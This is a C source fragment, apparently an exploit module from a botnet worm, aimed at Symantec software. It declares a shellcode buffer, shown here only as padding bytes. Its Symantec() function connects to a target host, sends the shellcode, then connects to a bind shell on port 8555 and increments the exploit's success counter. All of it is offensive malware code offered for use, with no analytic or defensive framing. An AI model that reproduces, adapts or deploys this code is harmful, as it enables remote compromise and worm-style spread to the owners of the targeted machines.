"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D";



unsigned long SymResolveAddress(char *szHost)
{
	unsigned long IP = inet_addr(szHost);
	if (IP == INADDR_NONE) {
		struct hostent *pHE = gethostbyname(szHost);
		if (pHE == 0)
			return INADDR_NONE;
		IP = *((unsigned long *)pHE->h_addr_list[0]);	
	}

	return IP;
}

BOOL Symantec(EXINFO exinfo) 
{ 
	SOCKET sock;
	struct sockaddr_in server;

	server.sin_family      = AF_INET;
	server.sin_addr.s_addr = finet_addr(exinfo.ip); 
    server.sin_port = fhtons((unsigned short)exinfo.port); 

	if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
		return FALSE;
	}

	if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
		closesocket(sock); 
		return FALSE;
	}

	if (send(sock, ShellCode, sizeof(ShellCode), 0) == SOCKET_ERROR) {
		closesocket(sock); 
		return FALSE;
	}
	closesocket(sock); 
	if (BuZShell(exinfo,8555)) { 
		exploit[exinfo.exploit].stats++; 
		return true; 
	}  
	return TRUE;
}
#endif